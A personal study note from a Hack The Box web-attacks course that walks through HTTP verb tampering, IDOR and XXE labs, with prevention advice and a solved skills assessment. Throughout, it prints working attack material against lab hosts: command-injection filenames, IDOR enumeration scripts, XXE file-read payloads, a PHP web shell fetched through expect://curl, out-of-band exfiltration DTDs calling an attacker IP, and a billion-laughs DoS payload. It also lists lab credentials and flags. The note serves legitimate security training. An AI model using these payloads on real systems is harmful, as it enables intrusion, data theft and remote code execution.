---
tags:
  - CWES
  - HTB
  - cybersecurity
xmind_sheet: "2"
source_file: "CWES.xmind"
---

# Web Attacks (can be found in any web application)

## Study Companion

### Prerequisites

HTTP methods, application roles, object identifiers, and XML basics.

### Learning Outcomes

- Test method consistency and backend authorization.
- Identify and validate IDOR/BOLA across users and objects.
- Assess XML parsers for XXE using minimal, controlled proofs.

### Practice Checkpoint

Build a two-user authorization matrix and test one object operation across both identities.

### Related Knowledge Map

- [[Maps/Authentication and Access Control|Authentication and Access Control]]
- [[Study Group Guide|CWES Study Group Guide]]

> [!info] Source
> Converted from the CWES XMind mind map. Topic hierarchy, notes, links, and embedded images were preserved.

## Professional Guidance

### Objective
Evaluate common web-application weaknesses—HTTP verb tampering, insecure direct object references (IDOR), and XML external entity (XXE) processing—for authorization bypass, cross-user data access or modification, file disclosure, and server-side impact in an authorized environment.

### Assessment Workflow
1. Map endpoints, methods, parameters, cookies, API objects, AJAX calls, user roles, and XML-processing features; capture a valid baseline for each relevant action.
2. Test method consistency with `OPTIONS` and controlled substitutions such as GET, POST, HEAD, PUT, PATCH, or DELETE, checking whether authentication, authorization, and input filters are applied identically.
3. Identify direct object references in URLs, bodies, headers, cookies, and JavaScript; compare two authorized users and vary sequential, encoded, hashed, or UUID-like references to test object-level authorization.
4. For XML inputs, first confirm entity expansion with a harmless internal entity, then test minimal local-file disclosure, source retrieval through safe wrappers where applicable, parser errors, and blind/out-of-band behavior only when authorized.
5. Assess chaining carefully—for example, information disclosure enabling object modification, verb tampering bypassing a reset restriction, or XXE exposing source code—without exceeding the agreed impact boundary.
6. Validate remediation through method-independent access control, per-object server-side authorization, opaque references that do not replace authorization, and XML parsers configured to disable DTDs, external/parameter entities, XInclude, and entity loops.

### Key Testing Principles
- Authorization must be enforced on every method and every object at the backend; UI restrictions, encoded identifiers, roles in cookies, and client-generated hashes are not security boundaries.
- Compare status, body, length, timing, and side effects; a familiar response can conceal access to a different user's object.
- Use bounded enumeration and benign XML targets; avoid denial-of-service entity expansion and uncontrolled code execution.
- Preserve session and role context so findings clearly distinguish horizontal access, vertical access, authentication bypass, and data disclosure.

### Evidence and Reporting
Provide paired baseline and tampered requests, authenticated identities/roles, object ownership, method changes, response differences, and a minimal proof of unauthorized read or write. For XXE, record parser behavior and the least-sensitive file or callback needed to prove impact. Report exploit chains separately from their component flaws and recommend centralized authorization, consistent verb handling, safe XML configuration, dependency updates, and non-verbose error handling.

<!-- BEGIN XMIND OUTPUTS -->
## XMind Outputs

> [!output] 🟨 Yellow means output
> The source XMind contains **42 yellow/output topics** in this module.

- [[Outputs/Modules/Web Attacks (can be found in any web application) Outputs|Open the verified output list]]
<!-- END XMIND OUTPUTS -->

## Complete Technical Reference

## most common 3 attacks

### HTTP Verb Tampering

- <https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering>
### Insecure Direct Object References (IDOR)

### XML External Entity (XXE) Injection

## HTTP verb Tampering

### Intro to HTTP Verb Tampering

- HTTP has 9 different verbs
  - <https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods>
- most commons
  - HEAD	Identical to a GET request, but its response only contains the headers, without the response body  
    PUT	Writes the request payload to the specified location  
    DELETE	Deletes the resource at the specified location  
    OPTIONS	Shows different options accepted by a web server, like accepted HTTP verbs  
    PATCH	Apply partial modifications to the resource at the specified location
    - developer may put restriction GET and POST only
### Bypassing Basic Authentication

- vulnerability scanning tools
  - identify HTTP Verb Tampering vulnerabilities caused by insecure server configurations
  - miss identifying HTTP Tampering vulnerabilities caused by insecure coding
- Identify
  - we have a basic File Manager
    - delete all files by clicking on the red Reset button
      - we get the following HTTP Basic Auth prompt
        - look at the URL we requested for in HTTP messages
          - /admin/reset.php
            - either the /admin directory is restricted to authenticated users only, or only the /admin/reset.php
              - visiting the /admin to confirm (indeed restricted)
- Exploit
  - As the page uses a GET request, we can send a POST request and see on /admin/reset.php
    - Unfortunately, we still get prompted to log in
      - web server configurations do cover both GET and POST requests
  - send an OPTIONS request to it and see what HTTP methods are accepted
    - curl -i -X OPTIONS http://SERVER_IP:PORT/
      - Allow: POST,OPTIONS,HEAD,GET
        - which is the default configuration for many web servers
  - HEAD method, which is identical to a GET
    - but the reset function should still get executed if the restriction was on GET and POST only
      - Once we change POST to HEAD and forward the request, we will see that we no longer get a login prompt or a 401 Unauthorized
        - we will see that all files have indeed been deleted successfully
          - HTB{4lw4y5_c0v3r_4ll_v3rb5}
          - so if its execute function is it BFLA ?
### Bypassing Security Filters

- if a security filter was being used to detect injection vulnerabilities and only checked for injections in POST parameters
  - changing the request method to GET.
- Identify
  - if we try to create a new file name with special characters in its name (e.g. test;)
    - Malicious request denied!
- Exploit
  - Change HTTP Method
    - GET /index.php?filename=test%3B
      - inded the file was created  
        test
        - confirm
          - file1; touch file2;
            - test  
              file1  
              file2
- LAB
  - To get the flag, try to bypass the command injection filter through HTTP Verb Tampering, while using the following filename: file; cp /flag.txt ./
    - file2; cp /flag.txt .
      - Change request Method from GET to POST
        - HTB{b3_v3rb_c0n51573n7}
### Verb Tampering Prevention

- can occur in most modern web servers, including Apache, Tomcat, and ASP.NET
  - example for an ASP.NET
    - <system.web>  
      <authorization>  
      <allow verbs="GET" roles="admin">  
      <deny verbs="GET" users="*">  
      </deny>  
      </allow>  
      </authorization>  
      </system.web
      - Once again, the allow and deny scope is limited to the GET method
## Insecure Direct Object References (IDOR)

### There are many ways of implementing a solid access control system for web applications

- like having a Role-Based Access Control (RBAC)
  - an IDOR vulnerability mainly exists due to the lack of an access control on the back-end.
- Many developers ignore building an access control system;
### IDOR/Access Control vulnerabilities

- found even in very large web applications, like Facebook, Instagram, and Twitter.
  - <https://infosecwriteups.com/disclose-private-attachments-in-facebook-messenger-infrastructure-15-000-ae13602aa486>
  - <https://infosecwriteups.com/add-description-to-instagram-posts-on-behalf-of-other-users-6500-7d55b4a24c5a>
  - <https://medium.com/@kedrisec/publish-tweets-by-any-other-user-6c9d892708e3>
### Identifying IDORs

- URL Parameters & APIs
  - look for URL parameters or APIs with an object reference (e.g. ?uid=1 or ?filename=file_1.pdf)
  - may also be found in other HTTP headers, like cookies.
- AJAX Calls
  - we may still be able to find the admin functions if we look into the front-end JavaScript code
    - If we identify direct object references in the JavaScript code, we can test them for IDOR vulnerabilities.
  - Code: javascript
    - function changeUserPassword() {  
      $.ajax({  
      url:"change_password.php",  
      type: "post",  
      dataType: "json",  
      data: {uid: user.uid, password: user.password, is_admin: is_admin},  
      success:function(result){  
      //  
      }  
      });  
      }
- Understand Hashing/Encoding
  - may encode the reference or hash it instead.
    - ?filename=ZmlsZV8xMjMucGRm
      - decode
        - file_123.pdf
    - download.php?filename=c81e728d9d4c2f636f067f89cc14862c
      - we may think that this is a secure
        - look at the source code
          - $.ajax({  
            url:"download.php",  
            type: "post",  
            dataType: "json",  
            data: {filename: CryptoJS.MD5('file_1.pdf').toString()},  
            success:function(result){  
            //  
            }  
            });
- Compare User Roles
  - User1
    - one of which can view their salary after making the following API call
      - {  
        "attributes" :  
        {  
        "type" : "salary",  
        "url" : "/services/data/salaries/users/1"  
        },  
        "Id" : "1",  
        "Name" : "User1"  
        }
  - User2
    - try repeating the same API call while logged in as User2
### Mass IDOR Enumeration

- Insecure Parameters
  - test on Employee Manager web application that hosts employee records:
    - URL parameter
      - we are logged in as an employee with user id uid=1
        - click on Documents
          - http://SERVER_IP:PORT/documents.php?uid=1
            - we see several documents that belong to our user
              - /documents/Invoice_1_09_2021.pdf
              - /documents/Report_1_10_2021.pdf
            - We notice
              - static file IDOR
                - names appear to be using the user uid and the month/year
              - poor web application design
                - uid in clear text as a direct reference in URL
                  - even If the back-end end of the web application does have a proper access control system, we will get some form of Access Denied.
          - http://SERVER_IP:PORT/documents.php?uid=2
            - we don't notice any difference that it still returns our own documents:
              - click on files to check more
                - keep an eye on
                  - source code
                  - page size
            - we got
              - documents belonging to the employee with uid=2
                - /documents/Invoice_2_08_2020.pdf
                - /documents/Report_2_12_2020.pdf
    - filter parameter
      - uid_filter=1
- Mass Enumeration
  - inspect and extract
    - curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
      - <li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>  
        <li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
        - use a Regex
          - curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
            - /documents/Invoice_3_06_2020.pdf  
              /documents/Report_3_01_2020.pdf
  - tool to get the files
    - Burp Intruder
    - ZAP Fuzzer
    - bash script
      - use a simple for loop to loop over the uid
        - #!/bin/bash  
          url="http://SERVER_IP:PORT"  
          for i in {1..10}; do  
          for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do  
          wget -q $url/$link  
          done  
          done
          - it will download all documents from all employees with uids between 1-10
- LAB
  - Repeat what you learned in this section to get a list of documents of the first 20 user uid's in /documents.php, one of which should have a '.txt' file with the flag.
    - uid was sent via POST
      - Fuzz in intruder
        - uid=15 got the flag
          - HTB{4ll_f1l35_4r3_m1n3}
### Bypassing Encoded References

- web applications make hashes or encode their object references
  - click on the Employment_contract.pdf
    - POST  
      contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
      - try match
        - using MD5 Manualy
          - echo -n 1 | md5sum
            - c4ca4238a0b923820dcc509a6f75849b
              - do not match
        - we may also utilize Burp Comparer and fuzz
      - very difficult to predict
        - Secure Direct Object Reference
- Function Disclosure
  - if the above hash was being calculated on the front-end
    - look at the link in the source code
      - it is calling a JavaScript function with javascript:downloadContract('1')
      - downloadContract()
        - function downloadContract(uid) {  
          $.redirect("/download.php", {  
          contract: CryptoJS.MD5(btoa(uid)).toString(),  
          }, "POST", "_self");  
          }
          - the final value being used in the POST request is the base64 encoded string of 1, which was then md5 hashed.
            - We can test this by base64 encoding our uid=1, and then hashing it with md5
              - echo -n 1 | base64 -w 0 | md5sum
                - cdd96d3cc73d1dbdaffa03cc6cd7339b
- Mass Enumeration
  - bash script to retrieve all employee contracts.
    - calculating the hash for each of the first ten employees
      - for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
        - cdd96d3cc73d1dbdaffa03cc6cd7339b  
          0b7e7dee87b1c3b98e72131173dfbbbf  
          0b24df25fe628797b3a50ae0724d2730  
          f7947d50da7a043693a592b4db43b0a1  
          8b9af1f7f76daf0f02bd9c48c4a2e3d0  
          006d1236aee3f92b8322299796ba1989  
          b523ff8d1ced96cef9c86492e790c2fb  
          d477819d240e7d3dd9499ed8d23e7158  
          3e57e65a34ffcb2e93cb545d024f5bde  
          5d4aace023dc088767b4e08c79415dcd
    - make a POST request on download.php with each of the above hashes as the contract value
      - #!/bin/bash  
        for i in {1..10}; do  
        for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do  
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php  
        done  
        done
    - run the script
      - bash ./exploit.sh
      - ls -1
        - contract_006d1236aee3f92b8322299796ba1989.pdf  
          contract_0b24df25fe628797b3a50ae0724d2730.pdf  
          contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf  
          contract_3e57e65a34ffcb2e93cb545d024f5bde.pdf  
          contract_5d4aace023dc088767b4e08c79415dcd.pdf  
          contract_8b9af1f7f76daf0f02bd9c48c4a2e3d0.pdf  
          contract_b523ff8d1ced96cef9c86492e790c2fb.pdf  
          contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf  
          contract_d477819d240e7d3dd9499ed8d23e7158.pdf  
          contract_f7947d50da7a043693a592b4db43b0a1.pdf
- LAB
  - Try to download the contracts of the first 20 employee, one of which should contain the flag, which you can read with 'cat'. You can either calculate the 'contract' parameter value, or calculate the '.pdf' file name directly
    - intercept the request when download contract file
      - GET /download.php?contract=MQ%3D%3D
        - decode as URL
          - MQ==
            - decode base64
              - 1
    - send to intruder
      - GET /download.php?contract=$$
        - Numbers from 1 to 20
          - Payload processing
            - Encode - base64
              - Encode - URL key characters
                - Start
                  - 20 is a hit
                    - HTB{h45h1n6_1d5_w0n7_570p_m3}
### IDOR in Insecure APIs

- functions and APIs can be used to change another user's private information, reset another user's password
- Identifying Insecure APIs
  - Edit Profile page
    - click Update profile
      - PUT /profile/api.php/profile/1  
        Cookie: role=employee  
        {  
        "uid" :1  
        "uuid" : "40f5888b67c748df7efba008e7c2f9d2",  
        "role" : "employee"  
        "full name": "Amy Lindon"  
        "email" :"a_lindon@employees.htb",  
        "about": "A Release is like a boat. 80% of the holes plugged is not good enough."  
        }
        - PUT requests are usually used in APIs to update item details
        - POST is used to create new items
        - we should be able to set an arbitrary role for our user, which may grant us more privileges
- Exploiting Insecure APIs
  - Change our uid to another user's uid, such that we can take over their accounts
    - e.g. "uid": 2
      - uid mismatch
    - /profile/api.php/profile/2, and change "uid": 2
      - uuid mismatch
  - Change another user's details, which may allow us to perform several web attacks
  - Create new users with arbitrary details, or delete existing users
    - POST, change the uid to a new uid, and send the request to the API endpoint of the new uid:
      - Creating new employees is for admins only
    - Deleting employees is for admins only
  - Change our role to a more privileged role (e.g. admin) to be able to perform more actions
    - change our role to admin/administrator
      - Invalid role
- LAB
  - Try to read the details of the user with 'uid=5'. What is their 'uuid' value?
    - GET /profile/api.php/profile/5
      - eb4fe264c10eb7a528b047aa983a4829
        - Information Disclosure
### Chaining IDOR Vulnerabilities

- Information Disclosure
  - GET /profile/api.php/profile/2
    - we got uuid of user 2
      - 4a9bd19b3b8676199592a346051f950c
  - enumerate all users and look for other roles
    - we now know the admin role name (web_admin)
- Modifying Other Users' Details
  - modifying a user's email address
    - PUT /profile/api.php/profile/2  
      Cookie: role-employee  
      {  
      "uid" :2,  
      "uuid": "4a9bd19b3b8676199592a346051f950c"  
      "role" : "employee"  
      "full_ name": "pwned",  
      "email": "pwned@employees.htb" ,  
      "about": "pwned"  
      }
      - we didnt get any error
      - we can requesting a password reset link
  - placing an XSS payload in the 'about' field
- Update profile button and change our role to web_admin
  - Cookie: role=web_admin,
  - "role": "web_admin",
- LAB
  - Try to change the admin's email to 'flag@idor.htb', and you should get the flag on the 'edit profile' page.
    - Fuzz
      - GET /profile/api.php/profile/1
        - from 1 to 20
          - 10 is staff_admin as seen in JSON
    - Modify
      - send PUT to /profile/10
        - Cookie: role=staff_admin  
          {"uid":"10","uuid":"bfd92386a1b48076792e68b596846499","role":"staff_admin","full_name":"admin","email":"flag@idor.htb","about":"Never gonna give you up, Never gonna let you down"}
          - success
    - get the flag by refresh in Edit Profile page
### IDOR Prevention

- Object-Level Access Control
  - RBAC
    - were not passed through the HTTP request
- Object Referencing
  - (e.g. uid=1). We should always use strong and unique references, like salted hashes or UUID
## XXE

### Intro

- not focused on displaying data but mostly on storing documents
  - Tag	The keys of an XML document, usually wrapped with (</>) characters.	<date>  
    Entity	XML variables, usually wrapped with (&/;) characters.	&lt;  
    Element	The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag.	<date>01-01-2022</date>  
    Attribute	Optional specifications for any element that are stored in the tags, which may be used by the XML parser.	version="1.0"/encoding="UTF-8"  
    Declaration	Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it.	<?xml version="1.0" encoding="UTF-8"?>
- XML DTD
  - pre-defined document structure can be defined in the document itself or in an external file.
    - <!DOCTYPE email [  
      <!ELEMENT email (date, time, sender, recipients, body)>
    - <?xml version="1.0" encoding="UTF-8"?>  
      <!DOCTYPE email SYSTEM "email.dtd">
    - <?xml version="1.0" encoding="UTF-8"?>  
      <!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
- XML Entities
  - variables and reduce repetitive data.
    - ENTITY keyword, which is followed by the entity name and its value, as follows:
      - <!ENTITY company "Inlane Freight">
- We may also use the PUBLIC keyword instead of SYSTEM for loading external resources
### Local File Disclosure

- Identifying XXE vulnerabilities
  - web pages that accept an XML user input in POST
    - <?xml version="1.0" encoding="UTF-8"?>  
      <root>  
      ‹name>  
      First  
      </ name>  
      ‹tel>  
      </tel>  
      <email>  
      email@xxe.htb  
      </email>  
      ‹message>  
      Test  
      </message>  
      </root>
      - email element is being displayed back to us on the page.
        - try to define a new entity and then use it as a variable in the email element
          - <?xml version="1.0" encoding="UTF-8"?>  
            <!DOCTYPE email [  
            <!ENTITY company "Inlane Freight">  
            <root>  
            <name>  
            First  
            </ name>  
            <tel>  
            </tel>  
            ‹email>  
            &company;  
            </email>  
            ‹message>  
            Test  
            </message>
            - Check your email Inlane Freight for further instructions
              - we may inject XML code
- Reading Sensitive Files
  - enables us to
    - configuration files
    - id_rsa SSH key of a specific user
    - content of the /etc/passwd
      - <!DOCTYPE email [  
        <!ENTITY company SYSTEM "file:///etc/passwd">  
        ]>
        - <?xml version="1.0" encoding="UTF-8"?>  
          <!DOCTYPE email [  
          <!ENTITY company SYSTEM "file:///etc/passwd">  
          ]>  
          <root>  
          ‹name>  
          First  
          </ name>  
          ‹tel>  
          </tel>  
          ‹email>  
          &company;  
          </email>  
          ‹message>  
          Test  
          </message>  
          </ root>
          - successfully
- Reading Source Code
  - let us see if we can use the same attack to read the source code of the index.php
    - file://index.php
      - Check your email for further instructions.
        - did not work
          - because the file we are referencing is not in a proper XML format
            - If a file contains some of XML's special characters (e.g. </>/&), it would break
        - PHP provides wrapper filters that allow us to base64 encode
          - only works with PHP web applications.
            - <!DOCTYPE email [  
              <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">  
              ]>
              - base64 encoded string of the index.php
                - decode
- Remote Code Execution with XXE
  - look for ssh keys
  - hash stealing trick in Windows-based web applications
  - PHP
    - PHP://expect filter
      - If the XXE directly prints its output 'as shown in this section', then we can execute basic commands as expect://id
    - The most efficient method
      - fetching a web shell from our server
        - writing a basic PHP web shell
          - echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
          - sudo python3 -m http.server 80
        - execute a curl command that downloads our web shell into the remote server
          - <?xml version="1.0"?>  
            <!DOCTYPE email [  
            <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">  
            ]>  
            <root>  
            <name></name>  
            <tel></tel>  
            <email>&company;</email>  
            <message></message>  
            </root>
            - we should receive a request on our machine for the shell.php
- Other XXE Attacks
  - Server-Side Attacks
  - Denial of Service (DOS)
    - <?xml version="1.0"?>  
      <!DOCTYPE email [  
      <!ENTITY a0 "DOS" >  
      <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">  
      <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">  
      <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">  
      <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">  
      <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">  
      <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">  
      <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">  
      <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">  
      <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">  
      <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">  
      ]>  
      <root>  
      <name></name>  
      <tel></tel>  
      <email>&a10;</email>  
      <message></message>  
      </root>
      - this attack no longer works with modern web servers
- LAB
  - Try to read the content of the 'connection.php' file, and submit the value of the 'api_key' as the answer.
    - <?xml version="1.0" encoding="UTF-8"?>  
      <!DOCTYPE email [  
      <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">  
      ]>  
      <root>  
      <name>gg</name>  
      <tel>1111111111</tel>  
      <email>&company;</email>  
      <message>rgdfhf</message>  
      </root>
      - UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg
### Advanced File Disclosure

- Advanced Exfiltration with CDATA
  - we can wrap the content of the external file reference with a CDATA tag (e.g. <![CDATA[ FILE_CONTENT ]]>). This way, the XML parser would consider this part raw data, which may contain any type of data
    - <!DOCTYPE email [  
      <!ENTITY begin "<![CDATA[">  
      <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">  
      <!ENTITY end "]]>">  
      <!ENTITY joined "&begin;&file;&end;">  
      ]>
      - this will not work, since XML prevents joining internal and external entities
        - XML Parameter Entities, a special type of entity that starts with a %
          - write our xxe.dtd file, host it on our machine
            - echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
            - python3 -m http.server 8000
          - reference our external entity (xxe.dtd) and then print the &joined;
            - <!DOCTYPE email [  
              <!ENTITY % begin "<![CDATA[">       <!-- prepend the beginning of the CDATA tag -->  
              <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">        <!-- reference external file -->  
              <!ENTITY % end "]]>">         <!-- append the end of the CDATA tag -->  
              <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">      <!-- reference our external DTD -->  
              %xxe;  
              ]>  
              ...  
              <email>&joined;</email>      <!-- reference the &joined; entity to print the file content -->
              - we can finally get the content of the submitDetails.php
- Error Based XXE
  - cause an error
    - bad URI
    - bad characters in the referenced file.
    - First, let's try to send malformed XML data
      - <roo> instead of <root>
        - we did indeed cause the web application to display an error
  - host a DTD file
    - <!ENTITY % file SYSTEM "file:///etc/hosts">  
      <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
  - call our external DTD script
    - <!DOCTYPE email [  
      <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">  
      %remote;  
      %error;  
      ]>
  - this method is not as reliable as the previous method for reading source files
- LAB
  - Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error').
    - Inspect the XML sended by POST
      - <?xml version="1.0" encoding="UTF-8"?>  
        <root>  
        <name>yg</name>  
        <tel>1111111</tel>  
        <email>A@AR.J</email>  
        <message>mygyjg8ku</message>  
        </root>
        - Check your email A@AR.J for further instructions.
    - Prepare xxe.dtd
      - echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
      - python3 -m http.server 8081
    - get the flag
      - <!DOCTYPE email [  
        <!ENTITY % begin "<![CDATA[">  
        <!ENTITY % file SYSTEM "file:///flag.php">  
        <!ENTITY % end "]]>">  
        <!ENTITY % xxe SYSTEM "http://10.10.14.4:8081/xxe.dtd">  
        %xxe;  
        ]>  
        <root>  
        <name>yg</name>  
        <tel>1111111</tel>  
        <email>  
        &joined;</email>  
        <message>mygyjg8ku</message>  
        </root>
        - <?php $flag = "HTB{3rr0r5_c4n_l34k_d474}"; ?>
### Blind Data Exfiltration

- Out-of-band Data Exfiltration
  - content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP
    - nano xxe.dtd
      - <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">  
        <!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.14.4:8000/?content=%file;'>">
    - simple PHP script that automatically detects the encoded file content, decodes name it as index.php
      - <?php  
        if(isset($_GET['content'])){  
        error_log("\n\n" . base64_decode($_GET['content']));  
        }  
        ?>
        - php -S 0.0.0.0:8000
  - initiate our attack
    - <?xml version="1.0" encoding="UTF-8"?>  
      <!DOCTYPE email [  
      <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">  
      %remote;  
      %oob;  
      ]>  
      <root>&content;</root>
      - go back to our terminal, and we will see that we did indeed get the request and its decoded content:
- Automated OOB Exfiltration
  - we can automate the process of blind XXE data exfiltration with tools. One such tool is
    - <https://github.com/enjoiz/XXEinjector>
      - git clone https://github.com/enjoiz/XXEinjector.git
        - copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line, and write XXEINJECT after it as a position locator for the tool:
          - POST /blind/submitDetails.php HTTP/1.1  
            Host: 10.129.201.94  
            ...  
            Connection: close  
            <?xml version="1.0" encoding="UTF-8"?>  
            XXEINJECT
  - run the tool with the --host/--httpport
    - ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
    - cat Logs/10.129.201.94/etc/passwd.log
      - root:x:0....
- LAB
  - Using Blind Data Exfiltration on the '/blind' page to read the content of '/327a6c4304ad5938eaf0efb6cc3e53dc.php' and get the flag.
    - Prepare HTTP message
      - nano xxe.req
        - POST /blind/submitDetails.php HTTP/1.1  
          Host: 10.129.1.6  
          User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0  
          Accept: */*  
          Accept-Language: en-US,en;q=0.5  
          Accept-Encoding: gzip, deflate, br  
          Referer: http://10.129.1.6/blind/  
          Content-Type: text/plain;charset=UTF-8  
          Content-Length: 245  
          Origin: http://10.129.1.6  
          DNT: 1  
          Connection: keep-alive  
          Sec-GPC: 1  
          Priority: u=0  
          <?xml version="1.0" encoding="UTF-8"?>  
          XXEINJECT
    - Start Server
      - php -S 0.0.0.0:8000
    - Attack
      - ruby XXEinjector.rb --host=10.10.14.4 --httpport=8000 --file=xxe.req --path=/327a6c4304ad5938eaf0efb6cc3e53dc.php --oob=http --phpfilter
        - cd Logs/
          - cat *.log
            - <?php $flag = "HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}"; ?>
### XXE Prevention

- Avoiding Outdated Components
  - XML library
    - <https://www.php.net/manual/en/function.libxml-disable-entity-loader.php>
  - <https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#php>
  - update any components that parse XML
    - API libraries like SOAP
    - SVG image processors
    - PDF document processors
- Using Safe XML Configurations
  - Disable referencing custom Document Type Definitions (DTDs)
  - Disable referencing External XML Entities
  - Disable Parameter Entity processing
  - Disable support for XInclude
  - Prevent Entity Reference Loops
- proper exception handling
  - should always disable displaying runtime errors in web servers.
- many also recommend using other formats
  - JSON
  - YAML
- avoiding API standards that rely on XML (e.g., SOAP) and using JSON-based APIs instead (e.g., REST).
## Skills Assessment

### Skills Assessment

**Objective:** Escalate privileges and validate the authorized lab vulnerabilities required to read `/flag.php`.  
**Lab credentials:** `htb-student:Academy_student!`

- Inestigate all the functions then look at HTTP requests
  - GET /api.php/user/74
    - {"uid":"74","username":"htb-student","full_name":"Paolo Perrone","company":"Schaefer Inc"}
  - GET /api.php/token/74
    - {"token":"e51a8a14-17ac-11ec-8e67-a3c050fe0c26"}
- Use Intruder from 1 to 74
  - GET /api.php/user/1
    - {"uid":"1","username":"s.applewhite","full_name":"Samanta Applewhite","company":"Daniel Inc"}
  - GET /api.php/user/52
    - {"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
- GET the token for the uid 52
  - GET /api.php/token/52
    - {"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
- reset.php function
  - POST /reset.php  
    Cookie: PHPSESSID=nfgc70lqb12j810mg4936embhl; uid=74  
    uid=74&token=e51a8a14-17ac-11ec-8e67-a3c050fe0c26&password=123
    - Now change uid 52
      - POST /reset.php HTTP/1.1  
        Cookie: PHPSESSID=nfgc70lqb12j810mg4936embhl; uid=52  
        uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=123
        - Access Denied
          - Change request method (from POST to GET)
            - Password changed successfully
- /addEvent.php
  - POST /addEvent.php HTTP/1.1  
    Content-Type: text/plain;charset=UTF-8  
    Cookie: PHPSESSID=nfgc70lqb12j810mg4936embhl; uid=52  
    <root>  
    <name>dg</name>  
    <details>dff</details>  
    <date>2026-04-25</date>  
    </root>
    - Event 'dg' has been created.
      - since it reflected we can inject XXE
        - POST /addEvent.php HTTP/1.1  
          Cookie: PHPSESSID=hrkke6uu887kofvv26amejjdc7; uid=52  
          <?xml version="1.0" encoding="UTF-8"?>  
          <!DOCTYPE root [  
          <!ENTITY flag SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">  
          ]>  
          <root>  
          <name>&flag;</name>  
          <details>test_event_detail</details>  
          <date></date>  
          </root>
          - HTTP body SHOULD BE seperate by 1 line after adding the banner  
            <?xml version="1.0" encoding="UTF-8"?>
          - Event 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' has been created.
            - decode base64
              - <?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?>
